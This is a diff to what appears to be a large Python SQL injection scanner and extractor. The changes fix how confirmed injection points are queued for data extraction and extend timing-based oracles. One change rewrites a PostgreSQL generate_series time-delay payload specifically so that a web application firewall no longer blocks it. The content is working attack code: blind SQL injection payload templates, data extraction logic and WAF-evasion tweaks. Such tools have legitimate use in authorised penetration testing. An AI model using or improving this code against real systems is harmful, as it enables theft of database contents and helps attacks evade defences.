                                 _result_already_pcv_verified = True  # BG task already ran PCV
 
-                #  Merge BG-detected injections into extraction queue 
+                #  Merge BG-detected injections into extraction queue
                 for _bg_conf in confirmed:
                     _bg_det = _bg_conf.get("result")
                     if _bg_det and hasattr(_bg_det, 'technique'):
                         _bg_param = getattr(_bg_det, 'param', _bg_conf.get("param", ""))
                         _bg_fmt = "header" if _bg_param != param else ep_fmt
                         _bg_orig = "127.0.0.1" if _bg_fmt == "header" else orig_val
+                        # FIX: Use the actual HTTP method from the BGD scan, not ep.method (primary).
+                        # _v14_bg_method() stores the actual method on detection.method.
+                        # Without this fix, extraction sends POST requests to GET/PUT/PATCH injection points.
+                        _bg_actual_method = (getattr(_bg_det, 'method', None)
+                                             or _bg_conf.get("method") if _bg_conf.get("method") not in (None, "expanded") else None
+                                             or ep.method)
                         all_confirmed.append({
                             "param": _bg_param, "original": _bg_orig,
                             "result": _bg_det, "url": _bg_conf.get("url", ep.url),
-                            "method": ep.method, "data_fmt": _bg_fmt,
+                            "method": _bg_actual_method, "data_fmt": _bg_fmt,
                             "data": _bg_conf.get("data", ep_data), "_extracted": False,
                         })
                         print(f"[+] [BGExtraction] Queued {_bg_param} [{_bg_det.technique}] {_bg_det.dbms} for extraction", flush=True)
@@ -125105,10 +125215,13 @@ class ScannerV14(ScannerV13):
                             _ev_param = getattr(_ev_det, 'param', 'unknown')
                             _ev_fmt = "header"
                             _ev_orig = "127.0.0.1"
+                            # FIX: Use detection.method if available (set by _v14_bg_method),
+                            # fallback to ep.method for primary surface injections.
+                            _ev_method = getattr(_ev_det, 'method', ep.method)
                             all_confirmed.append({
                                 "param": _ev_param, "original": _ev_orig,
                                 "result": _ev_det, "url": ep.url,
-                                "method": ep.method, "data_fmt": _ev_fmt,
+                                "method": _ev_method, "data_fmt": _ev_fmt,
                                 "data": ep_data, "_extracted": False,
                             })
                             print(f"[+] [BGExtraction] Recovered {_ev_param} [{_ev_det.technique}] {_ev_det.dbms} from event", flush=True)
@@ -125435,8 +125548,10 @@ class ScannerV14(ScannerV13):
                         _ext_fmt = "header" if _ext_param != param and _ext_param not in (ep.params if hasattr(ep, 'params') else []) else ep_fmt
                         _ext_orig = "127.0.0.1" if _ext_fmt == "header" else orig_val
 
-                        # KEY FIX: param-only key (no DBMS) to match _probe_one_param.
-                        _ext_key_v14 = _ext_param
+                        # FIX-V14-EXTGUARD-METHOD: Include method in extraction key so
+                        # the same param on different HTTP methods (GET vs PUT) can each
+                        # extract without the guard blocking the second as a duplicate.
+                        _ext_key_v14 = f"{_ext_param}@{ep.method}"
 
                         # FIX FUN-7 (Issue 5): Use the module-level _EXTRACTION_STARTED
                         # atomic flag as the primary guard.  The per-instance
@@ -125508,7 +125623,8 @@ class ScannerV14(ScannerV13):
                             else:
                                 _EXTRACTION_STARTED[0] = True
                                 if len(_EXTRACTION_STARTED) > 1:
-                                    _EXTRACTION_STARTED[1] = _ext_param
+                                    _dbms_v14 = getattr(result, 'dbms', '') or ''
+                                    _EXTRACTION_STARTED[1] = f"{_ext_param}@{_dbms_v14}@{ep.method}"
                                 self._extracting_params.add(_ext_key_v14)
                                 _v14_extraction_claimed = True
                         if not _v14_extraction_claimed:
@@ -130856,7 +130972,9 @@ class MultiStrategyExtractor:
         # 1=1 vs WHERE 1=2).  Including E/EH means two extra inline probes per scan; if
         # no gap is found the code falls through harmlessly.  Omitting them means MSE
         # skips the only reliable extraction oracle for WAF-blocked error channels.
-        if getattr(self.det, 'technique', '') in ('B', 'BH', 'IN', 'BT', 'ST', 'E', 'EH'):
+        if getattr(self.det, 'technique', '') in ('B', 'BH', 'IN', 'BT', 'ST', 'E', 'EH', 'T', 'TH', 'HQ'):
+            # FIX: Added T/TH/HQ — timing-detected injections also get boolean body-diff oracle.
+            # Previously HQ detection always got no oracle in MSE because HQ was not in this list.
             try:
                 _bbd_fp_t, _ = await self._timed(self._build_inline("1=1"))
                 await asyncio.sleep(0.3)
@@ -134792,10 +134910,13 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
             # Amazon Redshift does NOT support generate_series — fall through to pg_sleep.
             if _tp_technique == 'HQ' and dbms != "Amazon Redshift":
                 _hq_rows = max(1_000_000, min(int(t * 1_000_000), 10_000_000))
+                # FIX: Use IS NOT NULL instead of >0 — WAF blocks the '>' comparison operator
+                # at the outer level. count(*) IS NOT NULL is always TRUE but avoids the '>'
+                # that triggered WAF blocks on all extraction probes, causing timing to return "".
                 return (
                     f"{_tp_pfx}AND (SELECT count(*) FROM "
                     f"generate_series(1,CASE WHEN ({condition}) "
-                    f"THEN {_hq_rows} ELSE 1 END))>0{_tp_sfx}"
+                    f"THEN {_hq_rows} ELSE 1 END)) IS NOT NULL{_tp_sfx}"
                 )
             return (
                 f"{_tp_pfx}AND (CASE WHEN ({condition}) "
@@ -149069,7 +149190,10 @@ class ConditionalErrorTypeOracle:
                         # extraction probes will also be blocked → oracle unreliable.
                         continue
                 except Exception:
-                    pass  # WAF check failed → conservatively allow the oracle
+                    # FIX-BUG4-NOVEL-ORACLE-WAF: If the WAF check probe itself fails
+                    # (network error / timeout), we cannot verify oracle reliability →
+                    # skip this etype and try the next one.
+                    continue
                 return etype, clean_status, err_status, "status"
             if abs(err_len - clean_len) > 20:
                 _eo_max = max(err_len, clean_len, 1)
@@ -162481,10 +162605,14 @@ class ConditionalErrorOracle:
         prefixes so the oracle works regardless of how the target application embeds
         the injected parameter (quoted string, bare integer, double-quoted string)."""
         # Get baseline status
+        # FIX-BUG3-CEO-BASELINE: Add _bypass_mutation=True so the baseline probe
+        # isn't mangled by SQLMutationEngine (e.g. comment-splitting), which would
+        # return a non-200 error, poisoning self._baseline_status and making every
+        # subsequent _true_err/_false_ok comparison wrong.
         try:
             _fp = await _send_injected(self._engine, self._method, self._url,
                 self._data, self._data_fmt, self._param, self._original,
-                self._tamper_chain)
+                self._tamper_chain, _bypass_mutation=True)
             self._baseline_status = _fp.status_code if _fp else 200
         except Exception:
             self._baseline_status = 200
